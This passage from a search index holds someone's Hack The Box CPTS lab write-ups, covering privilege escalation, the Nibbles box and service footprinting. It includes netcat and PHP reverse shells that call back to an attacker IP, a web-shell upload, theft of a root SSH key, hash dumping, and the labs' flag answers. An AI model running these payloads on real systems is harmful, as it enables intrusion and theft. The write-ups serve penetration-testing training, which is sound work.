the server above with the provided credentials, and use the '-p xxxxxx' to specify the port shown above. Once you login, try to find a way to move to 'user2', to get the flag in '/home/user2/flag.txt'.</p> <pre><code>ssh user1@$ip -p 31459\n# password1\n\nsudo -l\n# User user1 may run the following commands on\n#        ng-644144-gettingstartedprivesc-udbk3-5969ffb656-cp248:\n#    (user2 : user2) NOPASSWD: /bin/bash\n\n# One way: \necho #!/bin/bash &gt; lala.sh\necho cat /home/user2/flag.txt &gt;&gt; lala.sh\nchmod +x lala.sh\nsudo -u user2  /bin/bash lala.sh\n\n# Another\nsudo -u user2 /bin/bash -i\n</code></pre> <p>Results:  HTB{l473r4l_m0v3m3n7_70_4n07h3r_u53r}</p> <p>Once you gain access to 'user2', try to find a way to escalate your privileges to root, to get the flag in '/root/flag.txt'.</p> <p>Once you are user2, go to /root:</p> <pre><code>cd /root\nls -la\n</code></pre> <pre><code>drwxr-x--- 1 root user2 4096 Feb 12  2021 .\ndrwxr-xr-x 1 root root  4096 Jun  3 19:21 ..\n-rwxr-x--- 1 root user2    5 Aug 19  2020 .bash_history\n-rwxr-x--- 1 root user2 3106 Dec  5  2019 .bashrc\n-rwxr-x--- 1 root user2  161 Dec  5  2019 .profile\ndrwxr-x--- 1 root user2 4096 Feb 12  2021 .ssh\n-rwxr-x--- 1 root user2 1309 Aug 19  2020 .viminfo\n-rw------- 1 root root    33 Feb 12  2021 flag.txt\n</code></pre> <p>So we have read access in .ssh folder. We can access and copy the private key </p> <pre><code>cd .ssh\ncat id_rsa\n</code></pre> <pre><code>-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn\n....\nQfPM8OxSjcVJCpAAAAEXJvb3RANzZkOTFmZTVjMjcwAQ==\n-----END OPENSSH PRIVATE KEY-----\n</code></pre> <p>In our attacker machine we save that id_rsa key in our folder</p> <pre><code>echo \"the key\" &gt; id_rsa\n</code></pre> <p>And now we can login as root</p> <pre><code>ssh root@$ip -p 31459 -i id_rsa\n</code></pre> <p>And cat the flag:</p> <pre><code>cat /root/flag.txt \n</code></pre> <p>Results:  HTB{pr1v1l363_35c4l4710n_2_r007}</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#attacking-your-first-box","title":"Attacking your first box","text":"","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#nibbles-enumeration","title":"Nibbles - Enumeration","text":"<p>Run an nmap script scan on the target. What is the Apache version running on the server? (answer format: X.X.XX)</p> <pre><code>sudo nmap -sC -sV $ip\n</code></pre> <p>Results:  2.4.18</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#nibbles-initial-foothold","title":"Nibbles - Initial Foothold","text":"<p>Gain a foothold on the target and submit the user.txt flag</p> <p>Enumerate resources</p> <pre><code>ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://$ip/nibbleblog/FUZZ -H \"HOST: $ip$\"\n\ndirb http://$ip/nibbleblog/\n</code></pre> <p>There are a lot of directory listing enabled. And eventually we can browser to: http://$ip/nibbleblog/content/private/users.xml</p> <p>We can identify the user admin.</p> <p></p> <p>We could also enumerate http://$ip/nibbleblog/admin.php</p> <p>Login access is admin:nibbles.</p> <p>Go to Plugins tab and locate MyImage one: http://$ip/nibbleblog/admin.php?controller=plugins&amp;action=config&amp;plugin=my_image</p> <p>Upload a PHP reverse shell, go to http://$IP/nibbleblog/content/private/plugins/my_image/ </p> <p>Set a netcat listener</p> <pre><code>nc -lnvp 1234\n</code></pre> <p>Click on the reverse shell \"image.php\" and we will get a reverse shell.</p> <pre><code>whoami\n#nibbler\n\ncat /home/nibbler/user.txt\n</code></pre> <p>Results:  79c03865431abf47b90ef24b9695e14879c03865431abf47b90ef24b9695e148</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#nibbles-privilege-escalation","title":"Nibbles - Privilege Escalation","text":"<p>Escalate privileges and submit the root.txt flag.</p> <pre><code>cd /home/nibbler\n</code></pre> <pre><code>sudo -l\n</code></pre> <p>Results:</p> <pre><code>Matching Defaults entries for nibbler on Nibbles:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser nibbler may run the following commands on Nibbles:\n    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh\n</code></pre> <p>The\u00a0<code>nibbler</code>\u00a0user can run the file\u00a0<code>/home/nibbler/personal/stuff/monitor.sh</code>\u00a0with root privileges. Being that we have full control over that file, if we append a reverse shell one-liner to the end of it and execute with\u00a0<code>sudo</code>\u00a0we should get a reverse shell back as the root user.</p> <pre><code>unzip personal.zip\nstrings /home/nibbler/personal/stuff/monitor.sh\n</code></pre> <pre><code>echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc $IPattacker 8443 &gt;/tmp/f' | tee -a monitor.sh\n</code></pre> <p>In the attacker machine, open a new netcat:</p> <pre><code>nc -lnvp 8443\n</code></pre> <p>Run monitor.sh with sudo</p> <pre><code>sudo ./monitor.sh\n</code></pre> <p>In the new netcat connection you are root.</p> <pre><code>cat /root/root.txt\n</code></pre> <p>Results: de5e5d6619862a8aa5b9b212314e0cdd</p> <p>Alternative way: Metasploit </p> <pre><code>exploit/multi/http/nibbleblog_file_upload\n</code></pre>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#knowledge-check","title":"Knowledge Check","text":"<p>Spawn the target, gain a foothold and submit the contents of the user.txt flag.</p> <pre><code>sudo nmap -sC -sV $ip\n</code></pre> <p>Go to http://$ip/robots.txt</p> <p>Go to http://$ip/admin</p> <p>Enter admin:admin</p> <p>Go to Edit Theme: http://$ip/admin/theme-edit.php</p> <p>Add a pentesmonkey shell and set a netcat listener on port 1234</p> <p>Add gettingstarte.htb to your hosts file</p> <p>Open the blog and you will get a reverse shell</p> <pre><code>cat /home/mrb3n/user.txt\n</code></pre> <p>Results: 7002d65b149b0a4d19132a66feed21d8</p> <p>After obtaining a foothold on the target, escalate privileges to root and submit the contents of the root.txt flag.</p> <p>Check out our permissions</p> <pre><code>sudo -l\n</code></pre> <p>Results:</p> <pre><code>Matching Defaults entries for www-data on gettingstarted:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser www-data may run the following commands on gettingstarted:\n    (ALL : ALL) NOPASSWD: /usr/bin/php\n</code></pre> <p>Grab a simple php reverse shell such as:</p> <pre><code>php -r '$sock=fsockopen(\"$AttackerIP\",4444);exec(\"/bin/sh &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");'\n</code></pre> <p>Set up a netcat listener on port 4444:</p> <pre><code>nc -lnvp\n</code></pre> <p>Run as sudo:</p> <pre><code>sudo /usr/bin/php -r '$sock=fsockopen(\"$AttackerIP\",4444);exec(\"/bin/sh &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");\n</code></pre> <p>You are root in the listener. Now</p> <pre><code>cat /root/root.txt\n</code></pre> <p>Results: f1fba6e9f71efb2630e6e34da6387842</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#network-enumeration-with-nmap","title":"Network Enumeration with Nmap","text":"","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#host-enumeration","title":"Host Enumeration","text":"","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#host-discovery","title":"Host Discovery","text":"<p>Based on the last result, find out which operating system it belongs to. Submit the name of the operating system as result.</p> <pre><code>sudo nmap $ip -sn -oA host -PE --packet-trace --disable-arp-ping \n</code></pre> <p>Result: Windows</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#host-and-port-scanning","title":"Host and Port Scanning","text":"<p>Find all TCP ports on your target. Submit the total number of found TCP ports as the answer.</p> <pre><code>nmap $ip\n</code></pre> <p>Results: 7</p> <p>Enumerate the hostname of your target and submit it as the answer. (case-sensitive):</p> <pre><code>sudo nmap $ip -Pn -sC -sV -p22,80,110,139,143,445,31337\n</code></pre> <p>Results: nix-nmap-default</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#saving-the-results","title":"Saving the Results","text":"<p>Perform a full TCP port scan on your target and create an HTML report. Submit the number of the highest port as the answer.</p> <pre><code>nmap $ip\n</code></pre> <p>Results: 31337</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#service-enumeration","title":"Service Enumeration","text":"<p>Enumerate all ports and their services. One of the services contains the flag you have to submit as the answer.</p> <pre><code>sudo nmap $ip -Pn -sC -sV -p22,80,110,139,143,445,31337\n</code></pre> <p>Results: HTB{pr0F7pDv3r510nb4nn3r}</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#nmap-scripting-engine","title":"Nmap Scripting Engine","text":"<p>Use NSE and its scripts to find the flag that one of the services contain and submit it as the answer.</p> <pre><code>sudo nmap $ip -p80 --script vuln\n</code></pre> <p>Result:</p> <pre><code>Pre-scan script results:\n| broadcast-avahi-dos: \n|   Discovered hosts:\n|     224.0.0.251\n|   After NULL UDP avahi packet DoS (CVE-2011-1002).\n|_  Hosts are all up (not vulnerable).\nNmap scan report for 10.129.68.164\nHost is up (0.047s latency).\n\nPORT   STATE SERVICE\n80/tcp open  http\n|_http-csrf: Couldn't find any CSRF vulnerabilities.\n|_http-dombased-xss: Couldn't find any DOM based XSS.\n|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.\n| http-enum: \n|_  /robots.txt: Robots file\n</code></pre> <p>Go to robots.txt and get the flag.</p> <p>Results: HTB{873nniuc71bu6usbs1i96as6dsv26}</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#bypass-security-measures","title":"Bypass Security Measures","text":"","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#firewall-and-idsips-evasion-easy-lab","title":"Firewall and IDS/IPS Evasion - Easy Lab","text":"<p>Our client wants to know if we can identify which operating system their provided machine is running on. Submit the OS name as the answer.</p> <pre><code>sudo nmap -sC -sV $ip -p80  -Pn --max-retries 3 --initial-rtt-timeout 50ms --max-rtt-timeout 100ms\n</code></pre> <p>Results: Ubuntu</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#firewall-and-idsips-evasion-medium-lab","title":"Firewall and IDS/IPS Evasion - Medium Lab","text":"<p>After the configurations are transferred to the system, our client wants to know if it is possible to find out our target's DNS server version. Submit the DNS server version of the target as the answer.</p> <pre><code>sudo nmap -sU -p53 --script dns-nsid $ip \n</code></pre> <p>Results: HTB{GoTtgUnyze9Psw4vGjcuMpHRp}</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#firewall-and-idsips-evasion-hard-lab","title":"Firewall and IDS/IPS Evasion - Hard Lab","text":"<p>Now our client wants to know if it is possible to find out the version of the running services. Identify the version of service our client was talking about and submit the flag as the answer.</p> <pre><code>sudo nc -nv -p 53 $ip  50000 \n</code></pre> <p>Results: HTB{kjnsdf2n982n1827eh76238s98di1w6}</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#footprinting","title":"Footprinting","text":"","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#host-based-enumeration","title":"Host Based Enumeration","text":"","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#ftp","title":"FTP","text":"<p>Which version of the FTP server is running on the target system? Submit the entire banner as the answer.</p> <pre><code>nc -nv $ip 21\n</code></pre> <p>Results: InFreight FTP v1.1</p> <p>Enumerate the FTP server and find the flag.txt file. Submit the contents of it as the answer.</p> <pre><code>ftp $ip\n</code></pre> <p>Enter user anonymous.</p> <p>Enter password anonymous.</p> <pre><code>ftp&gt; dir\nftp&gt; get flag.txt\nftp&gt; quit\n\ncat flag.\n</code></pre> <p>Results: HTB{b7skjr4c76zhsds7fzhd4k3ujg7nhdjre}</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#smb","title":"SMB","text":"<p>What version of the SMB server is running on the target system? Submit the entire banner as the answer.</p> <pre><code>sudo nmap $ip  -p445 -sV -A -sC\n</code></pre> <p>Results: Samba smbd 4.6.2</p> <p>What is the name of the accessible share on the target?</p> <pre><code> smbclient  -L //$ip \n</code></pre> <p>Results: sambashare</p> <p>Connect to the discovered share and find the flag.txt file. Submit the contents as the answer.</p> <pre><code>smbclient  //$ip/sambashare -U \"\"\ndir\ncd contents\nls\nget flag.txt\nquit\ncat flag.txt\n</code></pre> <p>Results: HTB{o873nz4xdo873n4zo873zn4fksuhldsf}</p> <p>Find out which domain the server belongs to.</p> <pre><code>rpcclient -U \"\" $ip\nrpcclient $&gt; querydominfo\n</code></pre> <p>Results: DEVOPS</p> <p>Find additional information about the specific share we found previously and submit the customized version of that specific share as the answer.</p> <pre><code>rpcclient $&gt; netsharegetinfo sambashare\n</code></pre> <p>Results: InFreight SMB v3.1</p> <p>What is the full system path of that specific share? (format: \"/directory/names\")</p> <pre><code>rpcclient $&gt; netsharegetinfo sambashare\n</code></pre> <p>Results: /home/sambauser</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#nfs","title":"NFS","text":"<p>Enumerate the NFS service and submit the contents of the flag.txt in the \"nfs\" share as the answer.</p> <pre><code>sudo nmap $ip -p111,2049 -sV -sC\nshowmount -e $ip \nmkdir target \nsudo mount -t nfs $ip:/ ./target -o nolock\ncd target \ntree .\ncat var/nfs/flag.txt \n</code></pre> <p>Results: HTB{hjglmvtkjhlkfuhgi734zthrie7rjmdze}</p> <p>Enumerate the NFS service and submit the contents of the flag.txt in the \"nfsshare\" share as the answer.</p> <pre><code>cat mnt/nfsshare/flag.txt \n</code></pre> <p>Results: HTB{8o7435zhtuih7fztdrzuhdhkfjcn7ghi4357ndcthzuc7rtfghu34}</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#dns","title":"DNS","text":"<p>Interact with the target DNS using its IP address and enumerate the FQDN of it for the \"inlanefreight.htb\" domain.</p> <pre><code>dig any inlanefreight.htb @$ip\n</code></pre> <p>Result:  ns.inlanefreight.htb</p> <p>Identify if its possible to perform a zone transfer and submit the TXT record as the answer. (Format: HTB{...))</p> <pre><code>#First, we do an initial transfer zone\ndig axfr inlanefreight.htb @$ip\n</code></pre> <p>Results:</p> <pre><code>; &lt;&lt;&gt;&gt; DiG 9.19.21-1-Debian &lt;&lt;&gt;&gt; axfr inlanefreight.htb @10.129.218.112\n;; global options: +cmd\ninlanefreight.htb.  604800  IN  SOA inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800\ninlanefreight.htb.  604800  IN  TXT \"MS=ms97310371\"\ninlanefreight.htb.  604800  IN  TXT \"atlassian-domain-verification=t1rKCy68JFszSdCKVpw64A1QksWdXuYFUeSXKU\"\ninlanefreight.htb.  604800  IN  TXT \"v=spf1 include:mailgun.org include:_spf.google.com include:spf.protection.outlook.com include:_spf.atlassian.net ip4:10.129.124.8 ip4:10.129.127.2 ip4:10.129.42.106 ~all\"\ninlanefreight.htb.  604800  IN  NS  ns.inlanefreight.htb.\napp.inlanefreight.htb.  604800  IN  A   10.129.18.15\ndev.inlanefreight.htb.  604800  IN  A   10.12.0.1\ninternal.inlanefreight.htb. 604800 IN   A   10.129.1.6\nmail1.inlanefreight.htb. 604800 IN  A   10.129.18.201\nns.inlanefreight.htb.   604800  IN  A   127.0.0.1\ninlanefreight.htb.  604800  IN  SOA inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800\n;; Query time: 44 msec\n;; SERVER: 10.129.218.112#53(10.129.218.112) (TCP)\n;; WHEN: Wed Jul 31 13:57:45 EDT 2024\n;; XFR size: 11 records (messages 1, bytes 560)\n</code></pre> <p>With the result, now we can do a second transfer zone</p> <pre><code>dig axfr internal.inlanefreight.htb @$ip\n</code></pre> <p>Results:</p> <pre><code>; &lt;&lt;&gt;&gt; DiG 9.19.21-1-Debian &lt;&lt;&gt;&gt; axfr internal.inlanefreight.htb @10.129.218.112\n;; global options: +cmd\ninternal.inlanefreight.htb. 604800 IN   SOA inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800\ninternal.inlanefreight.htb. 604800 IN   TXT \"MS=ms97310371\"\ninternal.inlanefreight.htb. 604800 IN   TXT \"HTB{DN5_z0N3_7r4N5F3r_iskdufhcnlu34}\"\ninternal.inlanefreight.htb. 604800 IN   TXT \"atlassian-domain-verification=t1rKCy68JFszSdCKVpw64A1QksWdXuYFUeSXKU\"\ninternal.inlanefreight.htb. 604800 IN   TXT \"v=spf1 include:mailgun.org include:_spf.google.com include:spf.protection.outlook.com include:_spf.atlassian.net ip4:10.129.124.8 ip4:10.129.127.2 ip4:10.129.42.106 ~all\"\ninternal.inlanefreight.htb. 604800 IN   NS  ns.inlanefreight.htb.\ndc1.internal.inlanefreight.htb. 604800 IN A 10.129.34.16\ndc2.internal.inlanefreight.htb. 604800 IN A 10.129.34.11\nmail1.internal.inlanefreight.htb. 604800 IN A   10.129.18.200\nns.internal.inlanefreight.htb. 604800 IN A  127.0.0.1\nvpn.internal.inlanefreight.htb. 604800 IN A 10.129.1.6\nws1.internal.inlanefreight.htb. 604800 IN A 10.129.1.34\nws2.internal.inlanefreight.htb. 604800 IN A 10.129.1.35\nwsus.internal.inlanefreight.htb. 604800 IN A    10.129.18.2\ninternal.inlanefreight.htb. 604800 IN   SOA inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800\n;; Query time: 44 msec\n;; SERVER: 10.129.218.112#53(10.129.218.112) (TCP)\n;; WHEN: Wed Jul 31 13:58:29 EDT 2024\n;; XFR size: 15 records (messages 1, bytes 677)\n</code></pre> <p>Then: HTB{DN5_z0N3_7r4N5F3r_iskdufhcnlu34}</p> <p>What is the IPv4 address of the hostname DC1?</p> <p>Get the answer from the response to the previous question. In this case: 10.129.34.16</p> <p>What is the FQDN of the host where the last octet ends with \"x.x.x.203\"?</p> <pre><code>dnsenum --dnsserver 10.129.218.112 --enum -p 0 -s 0 -o subdomains.txt -f /usr/share/seclists/Discovery/DNS/fierce-hostlist.txt dev.inlanefreight.htb\n</code></pre> <p>Results:</p> <pre><code>-----   dev.inlanefreight.htb   -----\n\n\nHost's addresses:\n__________________\n\n\n\nName Servers:\n______________\n\nns.inlanefreight.htb.                    604800   IN    A         127.0.0.1\n\n\nMail (MX) Servers:\n___________________\n\n\n\nTrying Zone Transfers and getting Bind Versions:\n_________________________________________________\n\nunresolvable name: ns.inlanefreight.htb at /usr/bin/dnsenum line 892 thread 2.\n\nTrying Zone Transfer for dev.inlanefreight.htb on ns.inlanefreight.htb ... \nAXFR record query failed: no nameservers\n\n\nBrute forcing with /usr/share/seclists/Discovery/DNS/fierce-hostlist.txt:\n__________________________________________________________________________\n\ndev1.dev.inlanefreight.htb.              604800   IN    A         10.12.3.6\nns.dev.inlanefreight.htb.                604800   IN    A         127.0.0.1\nwin2k.dev.inlanefreight.htb.             604800   IN    A        10.12.3.203\n</code></pre> <p>Therefore: win2k.dev.inlanefreight.htb</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#smtp","title":"SMTP","text":"<p>Enumerate the SMTP service and submit the banner, including its version as the answer.</p> <pre><code>sudo nmap $ip -sC -sV -p25\n</code></pre> <p>Results: InFreight ESMTP v2.11</p> <p>Enumerate the SMTP service even further and find the username that exists on the system. Submit it as the answer.</p> <pre><code>for user in $(cat ~/Downloads/footprintingusers.txt); do echo VRFY $user | nc -nv -w 6 $ip 25  ; done\n</code></pre> <p>Results: robin</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#imap-pop3","title":"IMAP / POP3","text":"<p>Figure out the exact organization name from the IMAP/POP3 service and submit it as the answer.</p> <pre><code>sudo nmap $ip -sV -p110,143,993,995 -sC\n</code></pre> <p>Results: InlaneFreight Ltd</p> <p>What is the FQDN that the IMAP and POP3 servers are assigned to?</p> <pre><code>sudo nmap $ip -sV -p110,143,993,995 -sC\n</code></pre> <p>Results: dev.inlanefreight.htb</p> <p>Enumerate the IMAP service and submit the flag as the answer. (Format: HTB{...})</p> <pre><code>echo $ip inlanefreight.htb dev.inlanefreight.htb &gt;&gt; /etc/hosts\ncurl -k 'imaps://dev.inlanefreight.htb' --user robin:robin -v\n</code></pre> <pre><code>* Host dev.inlanefreight.htb:993 was resolved.\n* IPv6: (none)\n* IPv4: 10.129.42.195\n*   Trying 10.129.42.195:993...\n* Connected to dev.inlanefreight.htb (10.129.42.195) port 993\n* TLSv1.3 (OUT), TLS handshake, Client hello (1):\n* TLSv1.3 (IN), TLS handshake, Server hello (2):\n* TLSv1.3 (IN), TLS handshake, Encrypted Extensions (8):\n* TLSv1.3 (IN), TLS handshake, Certificate (11):\n* TLSv1.3 (IN), TLS handshake, CERT verify (15):\n* TLSv1.3 (IN), TLS handshake, Finished (20):\n* TLSv1.3 (OUT), TLS change cipher, Change cipher spec (1):\n* TLSv1.3 (OUT), TLS handshake, Finished (20):\n* SSL connection using TLSv1.3 / TLS_AES_256_GCM_SHA384 / x25519 / RSASSA-PSS\n* Server certificate:\n*  subject: C=UK; ST=London; L=London; O=InlaneFreight Ltd; OU=DevOps Dep\ufffdartment; CN=dev.inlanefreight.htb; emailAddress=cto.dev@dev.inlanefreight.htb\n*  start date: Nov  8 23:10:05 2021 GMT\n*  expire date: Aug 23 23:10:05 2295 GMT\n*  issuer: C=UK; ST=London; L=London; O=InlaneFreight Ltd; OU=DevOps Dep\ufffdartment; CN=dev.inlanefreight.htb; emailAddress=cto.dev@dev.inlanefreight.htb\n*  SSL certificate verify result: self-signed certificate (18), continuing anyway.\n*   Certificate level 0: Public key type RSA (2048/112 Bits/secBits), signed using sha256WithRSAEncryption\n* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):\n* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):\n* old SSL session ID is stale, removing\n&lt; * OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ AUTH=PLAIN] HTB{roncfbw7iszerd7shni7jr2343zhrj}\n&gt; A001 CAPABILITY\n&lt; * CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ AUTH=PLAIN\n&lt; A001 OK Pre-login capabilities listed, post-login capabilities have more.\n&gt; A002 AUTHENTICATE PLAIN AHJvYmluAHJvYmlu\n&lt; * CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE SORT SORT=DISPLAY THREAD=REFERENCES THREAD=REFS THREAD=ORDEREDSUBJECT MULTIAPPEND URL-PARTIAL CATENATE UNSELECT CHILDREN NAMESPACE UIDPLUS LIST-EXTENDED I18NLEVEL=1 CONDSTORE QRESYNC ESEARCH ESORT SEARCHRES WITHIN CONTEXT=SEARCH LIST-STATUS BINARY MOVE SNIPPET=FUZZY PREVIEW=FUZZY LITERAL+ NOTIFY SPECIAL-USE\n&lt; A002 OK Logged in\n&gt; A003 LIST \"\" *\n&lt; * LIST (\\Noselect \\HasChildren) \".\" DEV\n* LIST (\\Noselect \\HasChildren) \".\" DEV\n&lt; * LIST (\\Noselect \\HasChildren) \".\" DEV.DEPARTMENT\n* LIST (\\Noselect \\HasChildren) \".\" DEV.DEPARTMENT\n&lt; * LIST (\\HasNoChildren) \".\" DEV.DEPARTMENT.INT\n* LIST (\\HasNoChildren) \".\" DEV.DEPARTMENT.INT\n&lt; * LIST (\\HasNoChildren) \".\" INBOX\n* LIST (\\HasNoChildren) \".\" INBOX\n&lt; A003 OK List completed (0.009 + 0.000 + 0.008 secs).\n* Connection #0 to host dev.inlanefreight.htb left intact\n</code></pre> <p>Results: HTB{roncfbw7iszerd7shni7jr2343zhrj}</p> <p>What is the customized version of the POP3 server?</p> <pre><code>openssl s_client -connect $ip:pop3s\n</code></pre> <p>Results: InFreight POP3 v9.188</p> <p>What is the admin email address?</p> <pre><code># Establish a imap connection\nopenssl s_client -connect $ip:imaps\n\n# Login as user robin with password robin\na LOGIN robin robin\n\n# List inboxes\na LIST \"\" *\n\n# Select one of them\na SELECT DEV.DEPARTMENT.INT\n\n# Retrieves the messages by ID\na FETCH 1 all\n</code></pre> <p>Results: devadmin@inlanefreight.htb</p> <p>Try to access the emails on the IMAP server and submit the flag as the answer. (Format: HTB{...})</p> <pre><code># Establish a imap connection\nopenssl s_client -connect $ip:imaps\n\n# Login as user robin with password robin\na LOGIN robin robin\n\n# List inboxes\na LIST \"\" *\n\n# Select one of them\na SELECT DEV.DEPARTMENT.INT\n\n# Retrieve the messages by ID\na FETCH 1 all\n\n# Retrieve the content of the message with id 1\na FETCH 1 BODY.PEEK[TEXT]\n</code></pre> <p>Results:  HTB{983uzn8jmfgpd8jmof8c34n7zio}</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#snmp","title":"SNMP","text":"<p>Enumerate the SNMP service and obtain the email address of the admin. Submit it as the answer.</p> <pre><code>snmpwalk -v2c -c public $ip\n</code></pre> <p>Results: devadmin@inlanefreight.htb</p> <p>What is the customized version of the SNMP server?</p> <pre><code>snmpwalk -v2c -c public $ip\n</code></pre> <p>Results: InFreight SNMP v0.91</p> <p>Enumerate the custom script that is running on the system and submit its output as the answer.</p> <pre><code>snmpwalk -v2c -c public $ip\n</code></pre> <p>Results: HTB{5nMp_fl4g_uidhfljnsldiuhbfsdij44738b2u763g}</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#mysql","title":"MySQL","text":"<p>Enumerate the MySQL server and determine the version in use. (Format: MySQL X.X.XX)</p> <pre><code>sudo nmap -sS -sV --script mysql-empty-password -p 3306 $ip -Pn\n</code></pre> <p>Results: MySQL 8.0.27</p> <p>During our penetration test, we found weak credentials \"robin:robin\". We should try these against the MySQL server. What is the email address of the customer \"Otto Lang\"?</p> <pre><code>mysql -u robin -probin -h $ip\nselect * from customers.myTable where name LIKE \"Otto Lang\";\n</code></pre> <p>Results: ultrices@google.htb</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#mssql","title":"MSSQL","text":"<p>Enumerate the target using the concepts taught in this section. List the hostname of MSSQL server.</p> <pre><code>nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 $ip\n</code></pre> <p>Results: ILF-SQL-01</p> <p>Connect to the MSSQL instance running on the target using the account (backdoor:Password1), then list the non-default database present on the server.</p> <pre><code>mssqlclient.py backdoor@$ip -windows-auth -p 1433\n\nSELECT name FROM master.dbo.sysdatabases\n</code></pre> <p>Results: Employees</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#oracle-tns","title":"Oracle TNS","text":"<p>Enumerate the target Oracle database and submit the password hash of the user DBSNMP as the answer.</p> <pre><code>python3 ./odat.py all -s $ip\n# With this we obtain the creds scott/tiger\n\n# Now we connect to the database\nsqlplus scott/tiger@$ip/XE as sysdba\n\n# Extract Password Hashes\nselect name, password from sys.user$;\n</code></pre> <p>Results: E066D214D5421CCC</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#ipmi","title":"IPMI","text":"<p>What username is configured for accessing the host via IPMI?</p> <pre><code>sudo msfdb init\nmsfconsole -q\nuse auxiliary/scanner/ipmi/ipmi_dumphashes\nsetg RHOSTS $ip\nrun\n</code></pre> <p>Results: admin</p> <p>What is the account's cleartext password?</p> <pre><code>sudo msfdb init\nmsfconsole -q\nuse auxiliary/scanner/ipmi/ipmi_dumphashes\nset PASS_FILE /usr/share/wordlists/rockyou.txt\nrun\n</code></pre> <p>Results: trinity</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#skills-assessment","title":"Skills assessment","text":"","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#footprinting-lab-easy","title":"Footprinting Lab - Easy","text":"<p>We were commissioned by the company\u00a0<code>Inlanefreight Ltd</code>\u00a0to test three different servers in their internal network. The company uses many different services, and the IT security department felt that a penetration test was necessary to gain insight into their overall security posture. The first server is an internal DNS server that needs to be investigated. In particular, our client wants to know what information we can get out of these services and how this information could be used against its infrastructure. Our goal is to gather as much information as possible about the server and find ways to use that information against the company. However, our client has made it clear that it is forbidden to attack the services aggressively using exploits, as these services are in production. Additionally, our teammates have found the following credentials \"ceil:qwer1234\", and they pointed out that some of the company's employees were talking about SSH keys on a forum. The administrators have stored a\u00a0<code>flag.txt</code>\u00a0file on this server to track our progress and measure success. Fully enumerate the target and submit the contents of this file as proof.</p> <p>Enumerate the server carefully and find the flag.txt file. Submit the contents of this file as the answer.</p> <pre><code>ftp $ip -p 2121\n# enter user `ceil` and password `qwer1234`\n\nls -la\ncd .ssh\nget id_rsa ~/.ssh/\nquit\n\nchmod 600 ~/.ssh/id_rsa\nssh -i ~/.ssh/id_rsa ceil@$ip\nfind / -name flag.txt 2&gt;/dev/null\ncat /home/flag/flag.txt\n</code></pre> <p>Results:  HTB{7nrzise7hednrxihskjed7nzrgkweunj47zngrhdbkjhgdfbjkc7hgj}</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#footprinting-lab-medium","title":"Footprinting Lab - Medium","text":"<p>This second server is a server that everyone on the internal network has access to. In our discussion with our client, we pointed out that these servers are often one of the main targets for attackers and that this server should be added to the scope. Our customer agreed to this and added this server to our scope. Here, too, the goal remains the same. We need to find out as much information as possible about this server and find ways to use it against the server itself. For the proof and protection of customer data, a user named\u00a0<code>HTB</code>\u00a0has been created. Accordingly, we need to obtain the credentials of this user as proof.</p> <p>Enumerate the server carefully 